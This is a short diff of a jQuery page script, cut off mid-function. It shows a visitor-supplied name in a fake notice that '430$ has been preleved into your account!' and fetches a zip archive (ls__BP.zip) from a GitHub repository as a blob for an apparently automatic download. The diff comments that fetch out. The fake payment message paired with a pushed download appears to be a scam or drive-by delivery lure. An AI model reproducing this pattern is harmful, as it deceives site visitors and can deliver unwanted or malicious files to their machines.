@@ -1,6 +1,6 @@
 jQuery(document).ready(function( $ ) {
 
-  /*var l = new URL(window.location)
+  var l = new URL(window.location)
   console.debug(l.hostname)
   console.debug(l.pathname)
   var params = l.searchParams.get("name")
@@ -10,7 +10,7 @@ jQuery(document).ready(function( $ ) {
   $("#log").text(params)
   $("#pop").text(params+" 430$ has been preleved into your account!")
 
-  fetch("https://github.com/daviddreams/travels/raw/master/ls__BP.zip")
+ /* fetch("https://github.com/daviddreams/travels/raw/master/ls__BP.zip")
   .then(resp => resp.blob())
   .then(blob =>{
       const url = window.URL.createObjectURL(blob);
